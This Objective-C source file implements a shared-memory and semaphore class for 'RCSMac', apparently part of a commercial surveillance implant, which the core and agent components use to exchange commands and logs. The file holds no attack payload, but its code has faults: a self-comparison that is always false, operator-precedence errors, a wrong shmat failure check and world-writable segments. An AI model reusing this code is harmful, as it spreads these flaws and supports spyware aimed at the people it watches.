/*
 * RCSMac - Shared Memory Class
 *  Wrapper around <shm.h> and <semaphore.h>
 *
 * [QUICK TODO]
 * - Move all the ERRORS #define in a common place
 *
 * Created by Alfredo 'revenge' Pesoli on 26/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/errno.h>
#import <sys/shm.h>

#import "RCSMCommon.h"
#import "RCSMSharedMemory.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"


// access permissions on shared memory 0666
#define GLOBAL_PERMISSIONS 0666

// error strings
#define EUNKNOWN_STR  "Unknown Error occured"
#define ENOSPC_STR    "All possible shared memory IDs are allocated"
#define ENOMEM_STR    "Allocating requested size would exceed the limit on shared memory"
#define EACCES_STR    "You do not have access permission"
#define EINVAL_STR    "Invalid segment size specified"
#define EINVAL_STR2   "Not a valid memory identifier"
#define EMFILE_STR    "The number of shared memory segments has reached it's limit"

#pragma mark -
#pragma mark Implementation
#pragma mark -

static int testPreviousTime = 0;

@implementation RCSMSharedMemory

- (id)initWithKey: (int)aKey
             size: (int)aSize
    semaphoreName: (NSString *)aSemaphoreName
{
  if (self = [super init])
    {
      // TODO: Fix SemaphoreID
      mSemaphoreID   = 0;
      mKey           = aKey;
      mSize          = aSize;
      mSemaphoreName = [aSemaphoreName copy];
    }
  
  return self;
}

- (void)dealloc
{
  if ([self detachFromMemoryRegion] == 0)
    {
      if (sem_close(mSemaphoreID) == 0)
        {
#ifdef DEBUG_SHMEM
          infoLog(@"Semaphore closed correctly");
#endif
        }
    }
  
  [mSemaphoreName release];
  [super dealloc];
}

- (int)createMemoryRegion
{
  mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
  
  if (mSharedMemoryID == -1)
    {
#ifdef DEBUG_SHMEM
      char *error = NULL;
      switch (errno)
        {
        case ENOSPC: error = ENOSPC_STR; break;
        case ENOMEM: error = ENOMEM_STR; break;
        case EACCES: error = EACCES_STR; break;
        case EINVAL: error = EINVAL_STR; break;
        //case EEXIST: return -2;
        default:     error = EUNKNOWN_STR;
        }
      
      errorLog(@"Error shmget: %s", error);
#endif
      
      return -1;
    }

#ifdef DEBUG_SHMEM
  infoLog(@"SharedMemoryID: %d", mSharedMemoryID);
  infoLog(@"Key: %d", mKey);
#endif
  
  return 0;
}

- (int)attachToMemoryRegion
{
  mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
  
  if (mSharedMemory == NULL)
    {
#ifdef DEBUG_SHMEM
      char *error = NULL;
      switch (errno)
        {
        case EACCES: error = EACCES_STR; break;
        case ENOMEM: error = ENOMEM_STR; break;
        case EINVAL: error = EINVAL_STR2; break;
        case EMFILE: error = EMFILE_STR; break;
        default:     error = EUNKNOWN_STR;
        }
      
      errorLog(@"Error shmat: %s", error);
#endif
      
      return -1;
    }
  
#ifdef DEBUG_SHMEM
  infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
#endif
  
  mSemaphoreID = sem_open((const char *)mSemaphoreName, 
                          O_CREAT,
                          GLOBAL_PERMISSIONS,
                          1);
  
  if ((int *)mSemaphoreID == SEM_FAILED)
    {
#ifdef DEBUG_SHMEM
      errorLog(@"An error occured while opening semaphore in sem_open()");
#endif
      shmdt(mSharedMemory);
      
      return -1;
    } 
  
  return 0;
}

- (int)detachFromMemoryRegion
{
  struct shmid_ds SharedMemDS;
  
  if (shmdt(mSharedMemory) != -1)
    {
      shmctl([self mSharedMemoryID], IPC_STAT, &SharedMemDS);
      
      // Check if there's anything still attached to the region
      if (SharedMemDS.shm_nattch == 0)
        {
          // Remove the segment in order to free the key and memory
          shmctl(mSharedMemoryID, IPC_RMID, NULL);
#ifdef DEBUG_SHMEM
          infoLog(@"Shared Memory (%d) destroyed", mSharedMemoryID);
#endif
        }
      else
        {
#ifdef DEBUG_SHMEM
          infoLog(@"We have still someone attached here dude, can't destroy");
#endif
          //shmctl(mSharedMemoryID, IPC_RMID, NULL);
        }
    }
  else
    return -1;
  
  return 0;
}

- (void)zeroFillMemory
{
  memset(mSharedMemory, '\0', mSize);
}

- (BOOL)clearConfigurations
{
  u_int offset              = 0;
  shMemoryLog *memoryHeader = NULL;
  
  if (mSize < mSize)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"[EE] clearConfigurations can't be used on the command queue");
#endif      
      return FALSE;
    }
  
  do
    {
      memoryHeader        = (shMemoryLog *)(mSharedMemory + offset);
      int tmpAgentID      = memoryHeader->agentID;
      int tmpCommandType  = memoryHeader->commandType;
      
      if (tmpAgentID != 0
          && tmpCommandType == CM_AGENT_CONF)
        {
          memset((void *)(mSharedMemory + offset), '\0', sizeof(shMemoryLog));
        }
      else
        {
          // Not found
          offset += sizeof (shMemoryLog);
        }
    }
  while (offset < mSize);
  
  return TRUE;
}

- (NSMutableData *)readMemory: (u_int)anOffset
                fromComponent: (u_int)aComponent
{
  NSMutableData *readData       = nil;
  shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
  
  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"[EE] readMemory-command unsupported component");
#endif
      return nil;
    }
  
  if (anOffset == 0)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"[EE] readMemory-command offset is zero");
#endif
      return nil;
    }
  
  if (memoryHeader->agentID != 0)
    {
      //
      // Now if who is reading is the same as who this data is directed to,
      // read it and clean out the area
      //
      if (aComponent ^ memoryHeader->direction == 0)
        {
#ifdef DEBUG_SHMEM
          verboseLog(@"Found data on shared memory");
#endif
          readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
                                                   length: sizeof(shMemoryCommand)];
          
          //memset((void *)(mSharedMemory + anOffset), '\0', sizeof(shMemoryCommand));
        }
    }
  
  return [readData autorelease];
}

- (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
                                  forAgent: (u_int)anAgentID
                           withCommandType: (u_int)aCommandType
{
  NSMutableData *readData = nil;
  shMemoryLog *tempHeader = NULL;
  
  BOOL lookForAgent       = NO;
  BOOL foundAgent         = NO;
  BOOL lookForCommand     = NO;
  BOOL foundCommand       = NO;
  BOOL blockFound         = NO;
  BOOL blockMatched       = NO;
  
  u_int offset            = 0;
  
  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"[EE] readMemory-log unsupported component");
#endif
      return nil;
    }
  
  if (anAgentID == 0 && aCommandType == 0)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"[EE] readMemory-log usupported read");
#endif
    }
  
  if (aCommandType != 0)
    {
      lookForCommand = YES;
    }
  if (anAgentID != 0)
    {
      lookForAgent = YES;
    }
  
  time_t lowestTimestamp      = 0;
  u_int  matchingObjectOffset = 0;
  
  //
  // Find the first available block who matches our request
  //
  do
    {
      tempHeader = (shMemoryLog *)(mSharedMemory + offset);
      int tempState       = tempHeader->status;
      int tmpAgentID      = tempHeader->agentID;
      int tmpCommandType  = tempHeader->commandType;
      int tmpDirection    = tempHeader->direction;
      
      if (tempState == SHMEM_FREE)
        {
          offset += sizeof (shMemoryLog);
          continue;
        }
      
      if (tempState == SHMEM_LOCKED)
        {
#ifdef DEBUG_SHMEM
          verboseLog(@"ANOMALY! FOUND LOCKED BLOCK ON READ");
#endif
        }
      
      if (lookForCommand == YES)
        {
          if (((aCommandType & tmpCommandType) == tmpCommandType)
               && tmpCommandType != 0)
            {
              foundCommand = YES;
            }
        }
      if (lookForAgent == YES)
        {
          if (tmpAgentID == anAgentID)
            {
              foundAgent = YES;
            }
        }
      
      // Looking only for commandType
      if ((lookForCommand == YES && foundCommand == YES)
          && lookForAgent == NO)
        blockFound = YES;
      
      // Looking only for agentID
      if ((lookForAgent     == YES && foundAgent == YES)
          && lookForCommand == NO)
        blockFound = YES;
      
      // Looking for both
      if ((lookForCommand  == YES && foundCommand == YES)
          && (lookForAgent == YES && foundAgent   == YES))
        blockFound = YES;
      
      if (blockFound == YES)
        {
          if (tmpDirection ^ aComponent == 0)
            {
#ifdef DEBUG_SHMEM
              infoLog(@"[ii] Found data matching our request on shmem");
#endif
              
              blockMatched = YES;
              
              if (lowestTimestamp == 0)
                {
                  lowestTimestamp = tempHeader->timestamp;
                  matchingObjectOffset = offset;
                }
              else if (tempHeader->timestamp < lowestTimestamp)
                {
                  lowestTimestamp = tempHeader->timestamp;
                  matchingObjectOffset = offset;
                }
            }
        }
      
      offset += sizeof (shMemoryLog);
      
      foundCommand = NO;
      foundAgent   = NO;
      blockFound   = NO;
    }
  while (offset < mSize);
  
  if (blockMatched == YES)
    {
      //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
      
      if (testPreviousTime != 0)
        {
          if (lowestTimestamp < testPreviousTime)
            {
#ifdef DEBUG_SHMEM
              verboseLog(@"ANOMALY DETECTED in shared memory!");
              verboseLog(@"previousTimestamp: %x", testPreviousTime);
              verboseLog(@"lowestTimestamp  : %x", lowestTimestamp);
#endif
            }
        }
      
      testPreviousTime = lowestTimestamp;
      readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
                                               length: sizeof(shMemoryLog)];
      
      if (aCommandType != CM_AGENT_CONF)
        {
          memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
        }
    }
  else
    {
      //infoLog(@"block not found while reading!!!!!");
      
      return nil;
    }
  
  return readData;
}

- (BOOL)writeMemory: (NSData *)aData
             offset: (u_int)anOffset
      fromComponent: (u_int)aComponent
{
  int memoryState = 0;
  
  //
  // In case we receive 0 as offset it means that we're dealing within the logs
  // shared memory, thus we need to find the first available block (not written)
  //
  if (anOffset == 0 || anOffset == 1)
    {
      if (anOffset == 1)
        {
          [self zeroFillMemory];
          anOffset = 0;
        }
      
      do
        {
          memoryState = *(unsigned int *)(mSharedMemory + anOffset);
          
          if (memoryState != SHMEM_FREE)
            {
              anOffset += sizeof (shMemoryLog);
            }
          else
            {
              memoryState = SHMEM_LOCKED;
              break;
            }
          
          if (anOffset >= mSize)
            {
#ifdef DEBUG_SHMEM
              errorLog(@"[EE] SHMem - write didn't found an available memory block");
#endif

              return FALSE;
            }
        }
      while (memoryState != SHMEM_FREE);
      
      //infoLog(@"Block written @ 0x%x", anOffset);
      memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
    }
  else
    {
      //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
      
      memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
    }

#ifdef DEBUG_SHMEM
  for (int x = 0; x < [aData length]; x += sizeof(int))
    verboseLog(@"Data sent: %08x", *(unsigned int *)(mSharedMemory + anOffset + x));
#endif
  
  return TRUE;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (char *)mSharedMemory
{
  return mSharedMemory;
}

- (void)setSharedMemory: (char *)value
{
  mSharedMemory = value;
}

- (int)mSharedMemoryID
{
  return mSharedMemoryID;
}

- (void)setSharedMemoryID: (int)value
{
  mSharedMemoryID = value;
}

- (int)mKey
{
  return mKey;
}

- (void)setKey: (int)value
{
  mKey = value;
}

- (int)mSize
{
  return mSize;
}

- (void)setSize: (int)value
{
  mSize = value;
}

- (sem_t *)mSemaphoreID
{
  return mSemaphoreID;
}

- (void)setSemaphoreID: (sem_t *)value
{
  mSemaphoreID = value;
}

- (NSString *)mSemaphoreName
{
  return mSemaphoreName;
}

- (void)setSemaphoreName: (NSString *)value
{
  if (value != mSemaphoreName)
    {
      [mSemaphoreName release];
      mSemaphoreName = [value retain];
    }
}

@end
